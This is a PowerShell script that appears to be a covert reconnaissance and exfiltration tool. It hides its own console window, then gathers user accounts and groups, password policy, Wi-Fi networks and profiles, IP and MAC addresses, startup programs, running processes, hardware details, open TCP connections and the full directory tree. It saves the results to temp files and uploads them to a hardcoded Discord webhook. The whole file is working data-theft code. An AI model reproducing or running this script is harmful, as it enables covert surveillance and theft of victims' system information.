#silently open:
# DllImport the ShowWindow function from user32.dll
$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $i -namespace native

# Hide the current PowerShell window
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)


#########################################################
# Powershell version
$psv = $PSVersionTable.PSVersion
#########################################################
#local users
$userGroups = @{}
Get-LocalGroup | ForEach-Object {
    $group = $_.Name
    try {
        Get-LocalGroupMember -Group $group | ForEach-Object {
            $user = $_.Name
            if ($userGroups.ContainsKey($user)) {
                $userGroups[$user] += ", $group"
            } else {
                $userGroups[$user] = $group
            }
        }
    } catch {
        # skip inaccessible groups
    }
}

# Convert the hashtable to a nicely formatted string
$userGroupsString = (
    $userGroups.GetEnumerator() | Sort-Object Name | ForEach-Object {
        "$($_.Key): $($_.Value)"
    }
) -join "`n"



#########################################################
#stuff about login and password
$password = net accounts | Format-List  | Out-String
#########################################################
#Wifi stuff
$nbwifi = netsh wlan show networks mode=bssid | Format-List  | Out-String
$wifipswrd = netsh wlan show profiles | Format-List  | Out-String
#########################################################
#IP stuff
$PublicIP = (Invoke-WebRequest -Uri "https://api.ipify.org").Content
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.AddressState -eq 'Preferred'}).IPAddress
$Mac = Get-NetAdapter | Select-object macaddress
#########################################################
#figuring out any antivirus
$antivirus = Get-Process
$startup = Get-WmiObject -Class Win32_StartupCommand | Select-Object Name, Command, Location
$startupString = (
    $startup | ForEach-Object {
        "{0,-25} {1}" -f $_.Name, $_.Command
    }
) -join "`n"
#########################################################
#sys info, COM and Serial Devices, Active TCP ports
$sysinfo = Get-ComputerInfo
$basicsysinfo = (Get-ComputerInfo | Select-Object CsName, WindowsVersion, OsArchitecture, WindowsCurrentVersion, BiosBIOSVersion, CsNetworkAdapters, CsProcessors, OsVersion, OsEncryptionLevel | Format-List  | Out-String).Trim()
$board=(Get-WmiObject Win32_BaseBoard | Format-List  | Out-String).Trim()
$RamCapacity=(Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String).Trim()
$Ram = (Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String).Trim()
$COMsrldvc = Get-WmiObject Win32_SerialPort | Select-Object DeviceID, Description
$OSinfo = Get-CimInstance -ClassName Win32_OperatingSystem
$OpenTCP = Get-NetTCPConnection
$OpenTcpstring = $OpenTcpstring = (
    $OpenTCP | ForEach-Object {
        "LocalAddress: $($_.LocalAddress), LocalPort: $($_.LocalPort), RemoteAddress: $($_.RemoteAddress), RemotePort: $($_.RemotePort), State: $($_.State)"
    }
) -join "`n"

#########################################################
#Tree
$tree = tree /a /f
#########################################################
#All current process
$process = Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -width 250
$reconsummary = @"
Powershell version is:
$psv
###################################################################

Users:
$userGroupsstring
####################################################################


Stuff about login and password (ex: when it was last reset miumum and maximum):
$password
###################################################################


Nearby Wifi:
$nbwifi

###################################################################

Wifi profiles:
$wifipswrd
###################################################################


Public IP:
$publicIP

Local Ip:
$localIP

Mac address:
$Mac
###################################################################


Startup folder:
$startupstring

###################################################################
Important sys info:
$basicsysinfo
###################################################################


Motherboard:
$board

Ram info:
$RamCapacity
$Ram
###################################################################


COM and Serial devices:
$COMsrldvc
###################################################################


OS info:
$OSinfo
##################################################################
#https://discord.com/api/webhooks/1367319520418467910/1sSKW35i7Qqah4PznlpvluRoa9gqom-qPH7-Ur9Mq0EfdumYH8uJdjLuyE3EAUcUIXRN

All current processes:
$process

Open Tcp ports:
$openTCPstring

"@ 
## Set temp folder path
$tempFolder = Join-Path -Path $env:TEMP -ChildPath $env:USERNAME
New-Item -ItemType Directory -Path $tempFolder -Force | Out-Null

# Define paths
$advReconPath = Join-Path $tempFolder "advanced-recon.txt"
$treePath = Join-Path $tempFolder "tree.txt"
$zipPath = Join-Path $tempFolder "tree.zip"

# Save reconsummary and tree to separate files
Set-Content -Path $advReconPath -Value $reconsummary -Force
Set-Content -Path $treePath -Value $tree -Force

# Compress tree.txt into tree.zip
Compress-Archive -Path $treePath -DestinationPath $zipPath -Force

# Create simple summary
$summary = @"
System Recon Report
====================
Username: $env:USERNAME
Public IP: $publicIP
Local IP: $localIP
RAM Capacity: $RamCapacity
Powershell version: $psv
====================
"@

# Send the summary as a Discord message
$webhookUrl = "https://discord.com/api/webhooks/1367319520418467910/1sSKW35i7Qqah4PznlpvluRoa9gqom-qPH7-Ur9Mq0EfdumYH8uJdjLuyE3EAUcUIXRN"
$payload = @{
    username = "$env:USERNAME System Report"
    content = $summary
}
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json -Depth 3) -ContentType 'application/json'

# Helper function to upload a file to the webhook
function Send-DiscordFile {
    param (
        [string]$filePath
    )

    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileContent = [System.IO.File]::ReadAllBytes($filePath)

    $bodyStream = New-Object System.IO.MemoryStream
    $writer = New-Object System.IO.StreamWriter($bodyStream)
    $writer.Write("--$boundary$LF")
    $writer.Write("Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF")
    $writer.Write("Content-Type: application/zip$LF$LF")
    $writer.Flush()

    $bodyStream.Write($fileContent, 0, $fileContent.Length)

    $writer = New-Object System.IO.StreamWriter($bodyStream)
    $writer.Write("$LF--$boundary--$LF")
    $writer.Flush()
    $bodyStream.Position = 0

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $bodyStream -ContentType "multipart/form-data; boundary=$boundary"
    $bodyStream.Close()
}

# Send advanced-recon.txt and tree.zip
Send-DiscordFile -filePath $advReconPath
Send-DiscordFile -filePath $zipPath